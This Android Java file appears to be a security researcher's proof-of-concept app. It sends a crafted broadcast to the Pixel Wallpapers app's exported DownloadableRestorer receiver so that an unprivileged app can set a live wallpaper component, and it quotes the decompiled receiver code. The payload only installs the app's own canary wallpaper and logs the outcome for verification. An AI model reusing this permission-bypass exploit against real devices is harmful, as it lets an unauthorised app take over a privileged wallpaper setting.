package com.cindrasec.wallpaperpoc;

import android.app.Activity;
import android.app.WallpaperInfo;
import android.app.WallpaperManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.os.Bundle;
import android.util.Log;

import java.util.List;

/**
 * Sends one broadcast to the Wallpapers app's exported DownloadableRestorer and
 * reports what the device did.
 *
 * The receiver's own code, decompiled from the installed APK, is:
 *
 *   Object extra = intent.getExtra("android.live_wallpaper.info");
 *   int target    = intent.getIntExtra("android.live_wallpaper.restore_target", 0);
 *   LiveWallpaperInfo info = new LiveWallpaperInfo((WallpaperInfo) extra);
 *   ...
 *   WallpaperSetter.setWallpaperComponent(wallpaperManager, info, target);
 *       -> wallpaperManager.setWallpaperComponentWithFlags(info.mInfo.getComponent(), ...)
 *
 * The ComponentName handed to a signature|privileged API therefore comes
 * straight out of an extra supplied by whoever sent the broadcast, and the only
 * thing standing in front of that receiver is a permission no package defines.
 *
 * This app never touches another app's data. The component it asks for is its
 * own canary service, so the only thing that changes on the device is which
 * wallpaper is showing, and that is reverted by picking any other wallpaper.
 */
public class MainActivity extends Activity {

    private static final String TAG = "WPPOC";

    private static final String TARGET_PKG = "com.google.android.apps.wallpaper";
    private static final String TARGET_CLS =
            "com.google.android.apps.wallpaper.module.DownloadableRestorer";
    private static final String ACTION =
            "com.google.android.apps.wallpaper.action.RESTORE_DOWNLOADABLE";

    private static final String EXTRA_INFO   = "android.live_wallpaper.info";
    private static final String EXTRA_TARGET = "android.live_wallpaper.restore_target";

    private static final String GUARD =
            "com.google.pixel.livewallpaper.permission.DOWNLOAD_LIVE_WALLPAPER";

    private static final String WALLPAPER_SERVICE_ACTION =
            "android.service.wallpaper.WallpaperService";

    @Override
    protected void onCreate(Bundle saved) {
        super.onCreate(saved);

        Intent in = getIntent();
        String action = in.getStringExtra("action");
        if (action == null) {
            action = "set";
        }

        Log.i(TAG, "================ " + action + " ================");
        Log.i(TAG, "package  " + getPackageName());
        reportPermission();
        reportCurrentWallpaper();

        if ("list".equals(action)) {
            list();
        } else {
            String target = in.getStringExtra("target");
            int dest = in.getIntExtra("dest", 0);
            set(target, dest);
        }

        finish();
    }

    /**
     * Says, from the device's own records, whether this build holds the guard
     * permission. Printing it on every run is what makes the pair of runs
     * readable later: the attacker log and the control log differ here first.
     */
    private void reportPermission() {
        int held = getPackageManager().checkPermission(GUARD, getPackageName());
        Log.i(TAG, "guard permission " + GUARD);
        Log.i(TAG, "  held by me: " + (held == PackageManager.PERMISSION_GRANTED));

        // And the permission that the receiver's work really needs, which no
        // third-party app can be granted. If this ever says true the whole
        // result is void, because then nothing was bypassed.
        int component = getPackageManager()
                .checkPermission("android.permission.SET_WALLPAPER_COMPONENT", getPackageName());
        Log.i(TAG, "  SET_WALLPAPER_COMPONENT held by me: "
                + (component == PackageManager.PERMISSION_GRANTED));
    }

    /** The before/after value. Read it from the framework, not from a guess. */
    private void reportCurrentWallpaper() {
        WallpaperManager wm = WallpaperManager.getInstance(this);
        WallpaperInfo cur = wm.getWallpaperInfo();
        if (cur == null) {
            Log.i(TAG, "current live wallpaper: none (static image)");
        } else {
            Log.i(TAG, "current live wallpaper: " + cur.getComponent().flattenToShortString());
        }
    }

    /** Every wallpaper service installed, and whether a WallpaperInfo parses. */
    private void list() {
        List<ResolveInfo> found = getPackageManager().queryIntentServices(
                new Intent(WALLPAPER_SERVICE_ACTION), PackageManager.GET_META_DATA);
        Log.i(TAG, found.size() + " wallpaper service(s) visible");
        for (ResolveInfo ri : found) {
            String name = ri.serviceInfo.packageName + "/" + ri.serviceInfo.name;
            try {
                new WallpaperInfo(this, ri);
                Log.i(TAG, "  OK      " + name);
            } catch (Exception e) {
                Log.i(TAG, "  UNUSABLE " + name + "  (" + e.getClass().getSimpleName() + ")");
            }
        }
    }

    /**
     * @param target pkg/cls of the wallpaper service to install, or null for
     *               this app's own canary.
     * @param dest   the receiver's restore_target extra: 0 = home screen.
     *               1 is refused by the receiver unless the device supports a
     *               lock-screen-only live wallpaper, so the default is 0.
     */
    private void set(String target, int dest) {
        if (target == null) {
            target = getPackageName() + "/" + CanaryWallpaperService.class.getName();
        }
        Log.i(TAG, "asking for component " + target + ", restore_target=" + dest);

        ResolveInfo chosen = null;
        for (ResolveInfo ri : getPackageManager().queryIntentServices(
                new Intent(WALLPAPER_SERVICE_ACTION), PackageManager.GET_META_DATA)) {
            if (target.equals(ri.serviceInfo.packageName + "/" + ri.serviceInfo.name)) {
                chosen = ri;
                break;
            }
        }
        if (chosen == null) {
            Log.e(TAG, "no wallpaper service matches " + target + " — run with --es action list");
            return;
        }

        WallpaperInfo info;
        try {
            info = new WallpaperInfo(this, chosen);
        } catch (Exception e) {
            Log.e(TAG, "could not build WallpaperInfo: " + e);
            return;
        }
        Log.i(TAG, "built WallpaperInfo for " + info.getComponent().flattenToShortString());

        Intent b = new Intent(ACTION);
        b.setComponent(new ComponentName(TARGET_PKG, TARGET_CLS));
        b.putExtra(EXTRA_INFO, info);
        b.putExtra(EXTRA_TARGET, dest);

        sendBroadcast(b);
        Log.i(TAG, "broadcast sent to " + TARGET_PKG + "/" + TARGET_CLS);
        Log.i(TAG, "nothing is thrown here either way: a sender refused for lack of the");
        Log.i(TAG, "permission is told nothing, so read the result from dumpsys wallpaper");
        Log.i(TAG, "and from the BroadcastQueue line in logcat, not from this app.");
    }
}
